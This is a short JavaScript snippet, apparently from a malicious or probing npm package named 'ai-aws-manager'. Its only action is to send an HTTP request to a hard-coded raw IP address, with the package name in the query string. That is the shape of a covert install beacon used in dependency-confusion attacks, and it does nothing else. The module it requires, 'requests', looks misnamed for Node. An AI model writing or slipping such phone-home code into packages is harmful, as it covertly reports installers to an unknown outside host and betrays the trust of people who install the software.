const request = require("requests")

let host = "128.199.122.145"
let packages = "ai-aws-manager"

request(`http://${host}/?${packages}`, (error, response, body) => {})